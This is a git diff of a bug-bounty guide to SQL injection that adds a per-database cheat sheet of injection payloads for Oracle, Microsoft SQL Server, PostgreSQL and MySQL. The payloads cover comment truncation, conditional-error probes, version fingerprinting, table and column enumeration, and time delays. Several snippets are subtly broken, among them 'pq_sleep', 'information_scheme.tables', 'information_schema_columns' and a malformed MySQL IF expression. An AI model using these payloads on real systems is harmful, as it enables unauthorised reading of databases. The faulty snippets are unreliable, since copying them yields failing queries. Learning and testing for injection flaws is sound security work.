@@ -4,7 +4,7 @@ As a bug bounty hunter, SQL injection vulnerabilities are a high-priority target
 
 SQL injection occurs when an attacker is able to inject malicious SQL code into a vulnerable web application, which is then executed by the database. This can happen when an application does not properly sanitize user input, allowing an attacker to insert their own SQL statements.
 
-To find SQL injection vulnerabilities, a bug bounty hunter can use a variety of methods, including:
+## To find SQL injection vulnerabilities, a bug bounty hunter can use a variety of methods, including:
 
 Manual testing: By using tools like Burp Suite or OWASP ZAP, a tester can manually inject SQL code into web forms and other input fields to see if the application is vulnerable. This method is time-consuming and requires a high degree of technical knowledge.
 
@@ -31,3 +31,172 @@ It's important to note that SQL injection vulnerabilities can be prevented by pr
 * [SQL Injection Tutorial: Learn with Example](https://www.guru99.com/learn-sql-injection-with-practical-example.html) - A pretty good overview of SQL Injection by Guru99
 * [SQL Injection - W3 Schools](https://www.w3schools.com/sql/sql_injection.asp) - An overview of SQL Injection by W3Schools
 * [SQL Injection Tutorial](https://hackertarget.com/sql-injection/) - A tutorial that is pretty good by Hacker Target
+
+
+## SQL Injection Cheat Sheet
+
+Below is a pretty good cheat sheet on SQL Injection. It is organized mostly by the manufactuer but some of the code examples can be used universally. Once you understand the principles of SQL Injection this will make a lot more sense.
+
+### String concatenation
+
+String concatention is the process of putting two strings together
+
+**Oracle**
+```
+'bond' || 'james bond'
+```
+**Microsoft**
+```
+'bond' + 'james bond'
+```
+**PostgreSQL**
+```
+'bond' || 'james bond'
+```
+**MySQL**
+```
+CONCAT('bond', 'james bond')
+```
+
+### Substring
+
+**Oracle**
+```
+SUBSTR('james bond', 3, 2)
+```
+**Microsoft**
+```
+SUBSTRING('james bond', 3, 2)
+```
+
+**PostgresSQL**
+```
+SUBSTRING('james bond', 3, 2)
+```
+
+**MySQL**
+```
+SUBSTRING ('james bond', 3, 2)
+```
+
+### Comments
+
+You can use comments to truncate or end a query
+
+**Oracle**
+```
+--comment
+```
+
+**Microsoft**
+```
+--comment
+/* comment */
+```
+
+**PostgreSQL**
+```
+--comment
+/* comment */
+```
+**MySQL**
+```
+#comment
+-- comment {This has a space after the double dash}
+/* comment */
+
+```
+
+### Conditional Errors
+
+Testing for a single boolean condition can trigger a database error and that can reveal quite a bit about the database and its contents
+
+**Oracle**
+```
+SELECT CASE WHEN (CONDITON-YOU-ARE-TESTING) THEN TO_CHAR (1/0) ELSE NULL END from dual
+```
+**Microsoft**
+```
+SELECT CASE WHEN (CONDITON-YOU-ARE-TESTING) THEN 1/0 ELSE NULL END
+```
+**ProgreSQL**
+```
+1 = (SELECT CASE WHEN(CONDITON-YOU-ARE-TESTING) THEN 1/(SELECT 0) ELSE NULL END)
+```
+**MySQL**
+```
+SELECT IF(CONDITON-YOU-ARE-TESTING, (SELECT table_name FROM information_scheme.tables,'a'))
+```
+
+### Database Version
+
+Determing the type and version of a database is crucial to finding out if it may be vulnerable to SQL Injection
+
+**Oracle**
+```
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+```
+
+**Microsoft**
+```
+SELECT @@version
+```
+
+**PostgreSQL**
+```
+SELECT version()
+```
+**MySQL**
+```
+SELECT @@version
+```
+## Database Contents
+
+Revealing the table contents can be a big win when performing a penetration test
+
+**Oracle**
+```
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'INSERT TABLE NAME'
+```
+
+**Microsoft**
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'INSERT TABLE NAME'
+```
+**PostgreSQL**
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema_columns WHERE table_name = 'INSERT TABLE NAME'
+```
+
+**MySQL**
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'INSERT TABLE NAME'
+```
+
+### Time Delays
+
+A time delay may cause a SQL database to become vulnerable or allow other attack vectors
+The follow shows how to create a delay of 15 seconds, you can of course do it for however long or short you want
+
+**Oracle**
+```
+dbms_pipe.recieve_message(('error'), 15)
+```
+**Microsoft**
+```
+WAITFOR DELAY '0:0:15'
+```
+
+**PostgreSQL**
+```
+SELECT pq_sleep(15)
+```
+**MySQL**
+```
+SELECT SLEEP(15)
+```
